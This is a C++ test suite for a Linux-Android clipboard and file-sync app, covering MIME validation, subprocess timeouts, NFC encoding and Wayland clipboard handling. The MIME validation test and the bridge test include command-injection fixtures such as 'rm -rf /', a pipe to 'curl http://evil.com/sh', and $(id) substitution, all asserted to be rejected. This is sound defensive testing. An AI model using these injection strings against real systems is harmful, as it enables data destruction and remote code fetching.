#include "desktop_entry.hpp"
#include "adb_helper.hpp"
#include "nfc_ntag5332.hpp"
#include "wayland_clipboard.hpp"
#include "l2a/engine.hpp"
#include "l2a/sha256.hpp"

#include <chrono>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>
#include <sys/stat.h>
#include <unistd.h>

#define TEST_ASSERT(cond) \
    do { \
        if (!(cond)) { \
            std::cerr << "Assertion failed: " << #cond << " at " << __FILE__ << ":" << __LINE__ << "\n"; \
            std::abort(); \
        } \
    } while (0)

namespace {

void test_linux01_mime_type_validation_and_injection_defense() {
    std::cout << "[TEST] 1. LINUX-01: MIME Type Validation & Command Injection Defense...\n";

    // Valid MIME types
    const std::vector<std::string> valid_mimes = {
        "text/plain",
        "text/html",
        "image/png",
        "image/jpeg",
        "application/octet-stream",
        "application/pdf",
        "application/vnd.android.package-archive",
        "audio/x-wav",
        "video/mp4"
    };

    for (const auto& mime : valid_mimes) {
        TEST_ASSERT(l2a::linux_app::WaylandClipboardBridge::is_valid_mime_type(mime));
    }

    // Malicious or invalid injection payloads
    const std::vector<std::string> malicious_mimes = {
        "",                                          // empty
        "text/plain; rm -rf /",                     // semicolon shell chaining
        "image/png'; touch /tmp/pwned; '",          // quote escaping
        "text/plain | curl http://evil.com/sh",      // pipe redirection
        "text/plain`whoami`",                       // backtick execution
        "text/plain$(id)",                          // command substitution
        "text/plain\nrm -rf /",                     // newline injection
        "text/plain\r\nid",                         // CRLF injection
        "text/plain&",                              // background execution
        "text/plain&&reboot",                       // logical AND chaining
        "text/plain>evil.txt",                      // output redirection
        "text/plain<evil.txt",                      // input redirection
        "plain_text_without_slash",                 // missing slash
        "text/plain space",                         // illegal whitespace
        "text/plain\tmore",                         // tab character
        "text/plain' OR '1'='1"                     // SQL-like / quotes
    };

    for (const auto& mime : malicious_mimes) {
        bool valid = l2a::linux_app::WaylandClipboardBridge::is_valid_mime_type(mime);
        TEST_ASSERT(!valid && "Malicious or invalid MIME type must be rejected!");
    }

    std::cout << "  -> PASSED: All safe MIME types accepted; all malicious injection vectors rejected.\n";
}

void test_linux08_linux09_subprocess_timeout_and_exit_code() {
    std::cout << "[TEST] 2. LINUX-08 & LINUX-09: Subprocess Non-blocking Timeout & Exit Code...\n";

    std::string out;

    // Test successful command execution and stdout capture
    int rc0 = l2a::linux_app::AdbHelper::run_cmd_capture("echo 'L2A_SUBPROCESS_TEST'", out, 5000);
    TEST_ASSERT(rc0 == 0);
    TEST_ASSERT(out.find("L2A_SUBPROCESS_TEST") != std::string::npos);

    // Test non-zero exit status parsing (LINUX-09: WEXITSTATUS)
    int rc42 = l2a::linux_app::AdbHelper::run_cmd_capture("exit 42", out, 5000);
    TEST_ASSERT(rc42 == 42);

    int rc1 = l2a::linux_app::AdbHelper::run_cmd_capture("exit 1", out, 5000);
    TEST_ASSERT(rc1 == 1);

    int rc127 = l2a::linux_app::AdbHelper::run_cmd_capture("exit 127", out, 5000);
    TEST_ASSERT(rc127 == 127);

    // Test timeout handling (LINUX-08: non-blocking poll timeout)
    // Run a command that sleeps for 10 seconds, but set timeout to 250 milliseconds
    auto start = std::chrono::steady_clock::now();
    int rcto = l2a::linux_app::AdbHelper::run_cmd_capture("sleep 10", out, 250);
    auto elapsed = std::chrono::steady_clock::now() - start;
    auto elapsed_ms = std::chrono::duration_cast<std::chrono::milliseconds>(elapsed).count();

    // Command must abort within reasonable time (< 2000 ms) and not hang for 10 seconds
    TEST_ASSERT(rcto != 0);
    TEST_ASSERT(elapsed_ms < 2000 && "Subprocess must terminate promptly upon timeout");
    TEST_ASSERT(out.find("timed out") != std::string::npos);

    std::cout << "  -> PASSED: Exit codes 0, 1, 42, 127 verified; 250ms timeout aborted command in "
              << elapsed_ms << " ms.\n";
}

void test_linux12_linux13_nfc_i2c_and_ndef_overflow() {
    std::cout << "[TEST] 3. LINUX-12 & LINUX-13: Dynamic I2C Dev Node & NDEF URI Length Validation...\n";

    // LINUX-12: Dynamic I2C resolution
    std::string dev_path = l2a::linux_app::NfcNtag5332Controller::resolve_i2c_dev_path();
    TEST_ASSERT(!dev_path.empty());
    TEST_ASSERT(dev_path.rfind("/dev/i2c-", 0) == 0);

    // LINUX-13: NDEF URI encoding with valid length
    std::string valid_uri = "l2a://tap?host_id=Redmi-G-Pro&port=53321&fp=0123456789ABCDEF";
    auto tlv = l2a::linux_app::NfcNtag5332Controller::encode_type5_ndef_tlv(valid_uri);
    TEST_ASSERT(!tlv.empty());
    // Capability container header: 0xE1 0x40 0x20 0x00
    TEST_ASSERT(tlv[0] == 0xE1);
    TEST_ASSERT(tlv[1] == 0x40);
    // NDEF TLV tag: 0x03
    TEST_ASSERT(tlv[4] == 0x03);
    // 4-byte block alignment
    TEST_ASSERT(tlv.size() % 4 == 0);

    // Boundary check: URI length = 253 bytes (1 + 253 = 254, max allowed for single-byte payload length)
    std::string max_valid_uri(253, 'a');
    auto tlv_max = l2a::linux_app::NfcNtag5332Controller::encode_type5_ndef_tlv(max_valid_uri);
    TEST_ASSERT(!tlv_max.empty());

    // Overflow check: URI length >= 254 bytes (1 + 254 = 255, overflows 8-bit NDEF length field)
    std::string overflow_uri_254(254, 'a');
    auto tlv_overflow = l2a::linux_app::NfcNtag5332Controller::encode_type5_ndef_tlv(overflow_uri_254);
    TEST_ASSERT(tlv_overflow.empty() && "URI length >= 254 must be rejected to prevent 8-bit overflow");

    std::string overflow_uri_500(500, 'b');
    auto tlv_overflow_500 = l2a::linux_app::NfcNtag5332Controller::encode_type5_ndef_tlv(overflow_uri_500);
    TEST_ASSERT(tlv_overflow_500.empty() && "URI length 500 must be rejected");

    // Empty URI check
    auto tlv_empty = l2a::linux_app::NfcNtag5332Controller::encode_type5_ndef_tlv("");
    TEST_ASSERT(tlv_empty.empty());

    std::cout << "  -> PASSED: Resolved I2C dev node " << dev_path
              << "; NDEF TLV byte length overflow boundaries (253 vs 254 vs 500) validated.\n";
}

void test_linux11_clipboard_anti_echo_hash() {
    std::cout << "[TEST] 4. LINUX-11: Clipboard Echo Loop Hash Defense...\n";

    std::string sample1 = "Hello, Linux to Android!";
    std::string sample2 = "Hello, Linux to Android!";
    std::string sample3 = "Different text";

    auto hash1 = l2a::sha256_string(sample1);
    auto hash2 = l2a::sha256_string(sample2);
    auto hash3 = l2a::sha256_string(sample3);

    TEST_ASSERT(hash1 == hash2 && "Identical text must produce identical SHA-256 for echo suppression");
    TEST_ASSERT(hash1 != hash3 && "Distinct text must produce distinct hashes");

    std::cout << "  -> PASSED: Anti-echo SHA-256 hash comparison verified.\n";
}

void test_real04_desktop_entry_installation_and_notification_args() {
    std::cout << "[TEST] 5. REAL-04 & R5: Desktop Entry Auto-Installation & Notification Hint Args...\n";

    auto temp_home = std::filesystem::temp_directory_path() /
                     ("l2a_test_home_" + std::to_string(::getpid()));
    std::error_code ec;
    std::filesystem::remove_all(temp_home, ec);

    // 1. Verify ensure_desktop_entry_installed creates target directory and desktop file
    l2a::linux_app::ensure_desktop_entry_installed(temp_home);

    auto desktop_file = temp_home / ".local" / "share" / "applications" / "l2a-desktop.desktop";
    TEST_ASSERT(std::filesystem::exists(desktop_file) && "l2a-desktop.desktop must be created");

    // 2. Verify file permissions (0644)
    struct stat st{};
    TEST_ASSERT(::stat(desktop_file.c_str(), &st) == 0);
    TEST_ASSERT((st.st_mode & 0777) == 0644 && "Desktop entry must have 0644 permissions");

    // 3. Read content and verify GNOME desktop specification fields
    std::ifstream ifs(desktop_file);
    TEST_ASSERT(ifs.is_open());
    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
    ifs.close();

    TEST_ASSERT(content.find("[Desktop Entry]") != std::string::npos);
    TEST_ASSERT(content.find("Type=Application") != std::string::npos);
    TEST_ASSERT(content.find("Name=Linux ⇄ Android") != std::string::npos);
    TEST_ASSERT(content.find("Exec=") != std::string::npos);
    TEST_ASSERT(content.find("Icon=network-transmit-receive") != std::string::npos);
    TEST_ASSERT(content.find("Categories=Utility;Network;FileTransfer;") != std::string::npos);

    // 4. Verify notification args formatting
    std::string title = "文件传输完成";
    std::string body = "photo_2026.jpg";
    auto args = l2a::linux_app::build_desktop_notification_args(title, body);

    TEST_ASSERT(args.size() == 9);
    TEST_ASSERT(args[0] == "notify-send");
    TEST_ASSERT(args[1] == "-a" && args[2] == "Linux ⇄ Android");
    TEST_ASSERT(args[3] == "-i" && args[4] == "network-transmit-receive");
    TEST_ASSERT(args[5] == "-h" && args[6] == "string:desktop-entry:l2a-desktop");
    TEST_ASSERT(args[7] == title);
    TEST_ASSERT(args[8] == body);

    std::filesystem::remove_all(temp_home, ec);
    std::cout << "  -> PASSED: Desktop entry created with valid schema and notification hints match GNOME grouping.\n";
}

void test_real02_real03_wayland_clipboard_bridge_logic() {
    std::cout << "[TEST] 6. REAL-02, REAL-03 & R2: Wayland Clipboard Bridge & Large Payload Handling...\n";

    auto base_dir = std::filesystem::temp_directory_path() /
                    ("l2a_bridge_test_" + std::to_string(::getpid()));
    std::error_code ec;
    std::filesystem::remove_all(base_dir, ec);

    l2a::EngineConfig cfg{};
    cfg.storage_dir = base_dir / "storage";
    cfg.receive_dir = base_dir / "receive";
    cfg.listen_port = 0;
    cfg.discovery_port = 0;

    l2a::Engine engine(cfg);

    std::vector<std::string> logs;
    l2a::linux_app::WaylandClipboardBridge bridge(engine, [&](const std::string& msg) {
        logs.push_back(msg);
    });

    TEST_ASSERT(bridge.is_sync_enabled());

    // 1. Inline text application
    l2a::ReceivedClipboardItem inline_item{};
    inline_item.clip_id = 201;
    inline_item.mime_type = "text/plain";
    std::string test_text = "Remote Android Clipboard Synchronized!";
    inline_item.data.assign(test_text.begin(), test_text.end());
    inline_item.total_size = test_text.size();

    bridge.apply_remote_clipboard(inline_item);

    bool found_inline_log = false;
    for (const auto& log : logs) {
        if (log.find("收到文本") != std::string::npos &&
            log.find("Remote Android Clipboard") != std::string::npos) {
            found_inline_log = true;
            break;
        }
    }
    TEST_ASSERT(found_inline_log && "Inline remote text clipboard must be processed and logged");

    // 2. Large text payload (> 512KB) streamed via temp file
    std::filesystem::create_directories(base_dir, ec);
    std::filesystem::path large_temp_file = base_dir / "large_payload.tmp";
    std::string large_text(600 * 1024, 'Z');
    {
        std::ofstream ofs(large_temp_file, std::ios::binary);
        TEST_ASSERT(ofs.is_open());
        ofs.write(large_text.data(), static_cast<std::streamsize>(large_text.size()));
        ofs.close();
    }

    l2a::ReceivedClipboardItem large_item{};
    large_item.clip_id = 202;
    large_item.mime_type = "text/plain";
    large_item.temp_file_path = large_temp_file.string();
    large_item.total_size = large_text.size();

    bridge.apply_remote_clipboard(large_item);

    bool found_large_log = false;
    for (const auto& log : logs) {
        if (log.find("614400 B") != std::string::npos) {
            found_large_log = true;
            break;
        }
    }
    TEST_ASSERT(found_large_log && "Large remote text via temp file must be processed and logged");

    // 3. Malicious MIME injection defense in apply_remote_clipboard
    l2a::ReceivedClipboardItem malicious_item{};
    malicious_item.clip_id = 203;
    malicious_item.mime_type = "text/plain; rm -rf /";
    malicious_item.data = {'b', 'a', 'd'};
    malicious_item.total_size = 3;

    bridge.apply_remote_clipboard(malicious_item);

    bool found_intercept_log = false;
    for (const auto& log : logs) {
        if (log.find("安全拦截") != std::string::npos &&
            log.find("text/plain; rm -rf /") != std::string::npos) {
            found_intercept_log = true;
            break;
        }
    }
    TEST_ASSERT(found_intercept_log && "Malicious MIME injection must be intercepted");

    // 4. Binary MIME type handling
    l2a::ReceivedClipboardItem bin_item{};
    bin_item.clip_id = 204;
    bin_item.mime_type = "image/png";
    bin_item.data = {0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A};
    bin_item.total_size = bin_item.data.size();

    bridge.apply_remote_clipboard(bin_item);

    // 5. Query environment helper functions
    (void)l2a::linux_app::WaylandClipboardBridge::is_wayland_session();
    (void)l2a::linux_app::WaylandClipboardBridge::has_wl_clipboard_tools();
    (void)l2a::linux_app::WaylandClipboardBridge::has_wl_paste_tools();

    std::filesystem::remove_all(base_dir, ec);
    std::cout << "  -> PASSED: Wayland clipboard bridge inline & 600KB temp file handling and security filters verified.\n";
}

void test_m1_c3_nautilus_uri_and_selective_paste() {
    std::cout << "[TEST] 7. M1-C3: Nautilus Image URI Resolution & Selective Paste Defense...\n";

    auto temp_dir = std::filesystem::temp_directory_path() /
                    ("l2a_test_nautilus_" + std::to_string(::getpid()));
    std::error_code ec;
    std::filesystem::remove_all(temp_dir, ec);
    std::filesystem::create_directories(temp_dir, ec);

    // 1. Create test image files and non-image files
    auto png_path = temp_dir / "sample_test.png";
    {
        std::ofstream ofs(png_path, std::ios::binary);
        ofs << "fake png data";
    }

    auto space_jpg_path = temp_dir / "my holiday photo.jpg";
    {
        std::ofstream ofs(space_jpg_path, std::ios::binary);
        ofs << "fake jpg data";
    }

    auto txt_path = temp_dir / "notes.txt";
    {
        std::ofstream ofs(txt_path);
        ofs << "some plain text notes";
    }

    // 2. Test standard file:// URI
    std::string uri_png = "file://" + png_path.string();
    auto res_png = l2a::linux_app::try_resolve_local_image_file(uri_png);
    TEST_ASSERT(res_png.is_image == true);
    TEST_ASSERT(res_png.path == png_path);
    TEST_ASSERT(res_png.mime_type == "image/png");

    // 3. Test percent-encoded URI with spaces (e.g. Nautilus copy)
    std::string uri_space = "file://" + temp_dir.string() + "/my%20holiday%20photo.jpg";
    auto res_space = l2a::linux_app::try_resolve_local_image_file(uri_space);
    TEST_ASSERT(res_space.is_image == true);
    TEST_ASSERT(res_space.path == space_jpg_path);
    TEST_ASSERT(res_space.mime_type == "image/jpeg");

    // 4. Test Nautilus multi-line format with 'copy' or 'cut' header
    std::string nautilus_payload = "copy\r\nfile://" + png_path.string() + "\r\n";
    auto res_nautilus = l2a::linux_app::try_resolve_local_image_file(nautilus_payload);
    TEST_ASSERT(res_nautilus.is_image == true);
    TEST_ASSERT(res_nautilus.path == png_path);
    TEST_ASSERT(res_nautilus.mime_type == "image/png");

    // 5. Test raw local path
    auto res_raw = l2a::linux_app::try_resolve_local_image_file(png_path.string());
    TEST_ASSERT(res_raw.is_image == true);
    TEST_ASSERT(res_raw.path == png_path);

    // 6. Test non-image file (e.g. .txt)
    auto res_txt = l2a::linux_app::try_resolve_local_image_file("file://" + txt_path.string());
    TEST_ASSERT(res_txt.is_image == false);

    // 7. Test non-existent file
    auto res_nonexistent = l2a::linux_app::try_resolve_local_image_file("file:///tmp/definitely_not_existing_123456.png");
    TEST_ASSERT(res_nonexistent.is_image == false);

    // 8. Test plain text string
    auto res_plain = l2a::linux_app::try_resolve_local_image_file("Just some regular user text without path");
    TEST_ASSERT(res_plain.is_image == false);

    // 9. Test Selective Paste Guard Flag
    l2a::EngineConfig cfg{};
    cfg.storage_dir = temp_dir / "storage";
    cfg.receive_dir = temp_dir / "receive";
    cfg.listen_port = 0;
    cfg.discovery_port = 0;
    l2a::Engine test_engine(cfg);

    l2a::linux_app::WaylandClipboardBridge bridge(test_engine, [](const std::string&) {});
    TEST_ASSERT(!bridge.is_selective_pasting());

    l2a::ClipboardHistoryItem item_k{};
    item_k.id = 1;
    item_k.mime_type = "text/plain";
    item_k.text_preview = "Selective";
    item_k.full_text = "Selective";

    l2a::ClipboardHistoryItem item_0{};
    item_0.id = 2;
    item_0.mime_type = "text/plain";
    item_0.text_preview = "Original";
    item_0.full_text = "Original";

    bridge.perform_selective_paste(item_k, item_0);
    // Guard flag must be set
    TEST_ASSERT(bridge.is_selective_pasting() == true);

    std::filesystem::remove_all(temp_dir, ec);
    std::cout << "  -> PASSED: Nautilus URI parsing, percent-decoding, extension check, and selective paste lease verified.\n";
}

void test_m1_c3_remediations() {
    std::cout << "[TEST] 8. M1-C3 Remediation: Manual Pull Override, Non-blocking Selective Paste & Image Disk Caching...\n";

    auto temp_dir = std::filesystem::temp_directory_path() /
                    ("l2a_test_remediation_" + std::to_string(::getpid()));
    std::error_code ec;
    std::filesystem::remove_all(temp_dir, ec);
    std::filesystem::create_directories(temp_dir, ec);

    l2a::EngineConfig cfg{};
    cfg.storage_dir = temp_dir / "storage";
    cfg.receive_dir = temp_dir / "receive";
    cfg.listen_port = 0;
    cfg.discovery_port = 0;
    l2a::Engine test_engine(cfg);

    std::vector<std::string> log_messages;
    l2a::linux_app::WaylandClipboardBridge bridge(test_engine, [&](const std::string& msg) {
        log_messages.push_back(msg);
    });

    // 1. Verify manual pull response when phone_to_pc_auto_share is false
    bridge.set_phone_to_pc_auto_share(false);
    TEST_ASSERT(bridge.phone_to_pc_auto_share() == false);

    l2a::ReceivedClipboardItem item{};
    item.clip_id = 1;
    item.mime_type = "text/plain";
    std::string text_data = "Phone clipboard text";
    item.data.assign(text_data.begin(), text_data.end());
    item.sha256 = l2a::sha256_bytes(item.data);

    // Unsolicited remote clipboard when auto-share is false -> skipped
    log_messages.clear();
    bridge.apply_remote_clipboard(item);
    TEST_ASSERT(!log_messages.empty());
    TEST_ASSERT(log_messages.back().find("自动共享已关闭，跳过") != std::string::npos);

    // Now trigger manual pull -> manual_pull_pending_ becomes true
    (void)bridge.pull_remote_clipboard(); // no peer connected, but sets manual_pull_pending_
    log_messages.clear();
    bridge.apply_remote_clipboard(item);
    TEST_ASSERT(!log_messages.empty());
    TEST_ASSERT(log_messages.front().find("收到手动拉取的剪贴板内容") != std::string::npos);

    // 1b. Verify protocol-flagged pull response (is_pull_response = true) bypasses phone_to_pc_auto_share = false
    l2a::ReceivedClipboardItem flagged_pull = item;
    flagged_pull.is_pull_response = true;
    log_messages.clear();
    bridge.apply_remote_clipboard(flagged_pull);
    TEST_ASSERT(!log_messages.empty());
    TEST_ASSERT(log_messages.front().find("收到手动拉取的剪贴板内容") != std::string::npos);

    // 2. Verify non-blocking consecutive perform_selective_paste (no UI freeze)
    l2a::ClipboardHistoryItem hist_item1{};
    hist_item1.id = 10;
    hist_item1.mime_type = "text/plain";
    hist_item1.full_text = "Item 10";

    l2a::ClipboardHistoryItem hist_item2{};
    hist_item2.id = 11;
    hist_item2.mime_type = "text/plain";
    hist_item2.full_text = "Item 11";

    l2a::ClipboardHistoryItem hist_top{};
    hist_top.id = 1;
    hist_top.mime_type = "text/plain";
    hist_top.full_text = "Top Item";

    auto t_start = std::chrono::steady_clock::now();
    bridge.perform_selective_paste(hist_item1, hist_top);
    // Rapid consecutive click must NOT block on previous restore thread
    bridge.perform_selective_paste(hist_item2, hist_top);
    auto duration_ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                           std::chrono::steady_clock::now() - t_start)
                           .count();
    TEST_ASSERT(duration_ms < 100); // Must be non-blocking (< 100ms, not 3000ms!)
    TEST_ASSERT(bridge.is_selective_pasting());

    // 3. Verify raw in-memory image disk caching
    std::vector<uint8_t> fake_png = {0x89, 'P', 'N', 'G', 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x01, 0x02};
    auto img_sha = l2a::sha256_bytes(fake_png);
    l2a::ClipboardHistoryManager hist(temp_dir / "history.json", 20);
    uint64_t added_id = hist.add_image_item(l2a::ClipOrigin::Local, "image/png", fake_png, {}, img_sha);
    auto added_opt = hist.get_item(added_id);
    TEST_ASSERT(added_opt.has_value());
    TEST_ASSERT(!added_opt->image_path.empty());
    TEST_ASSERT(std::filesystem::exists(added_opt->image_path));

    // Verify selective paste of this disk-cached image works without error
    bridge.perform_selective_paste(*added_opt, hist_top);
    TEST_ASSERT(bridge.is_selective_pasting());

    std::filesystem::remove_all(temp_dir, ec);
    std::cout << "  -> PASSED: Manual pull override, non-blocking selective paste (< "
              << duration_ms << " ms), and raw image disk caching verified.\n";
}

}  // namespace

int main() {
    std::cout << "=========================================================\n";
    std::cout << "Running Linux Subsystem Remediation Test Suite (M2 + M3)\n";
    std::cout << "=========================================================\n";

    test_linux01_mime_type_validation_and_injection_defense();
    test_linux08_linux09_subprocess_timeout_and_exit_code();
    test_linux12_linux13_nfc_i2c_and_ndef_overflow();
    test_linux11_clipboard_anti_echo_hash();
    test_real04_desktop_entry_installation_and_notification_args();
    test_real02_real03_wayland_clipboard_bridge_logic();
    test_m1_c3_nautilus_uri_and_selective_paste();
    test_m1_c3_remediations();

    std::cout << "=========================================================\n";
    std::cout << "All Linux Subsystem Remediation Tests PASSED (8/8)!\n";
    std::cout << "=========================================================\n";
    return 0;
}

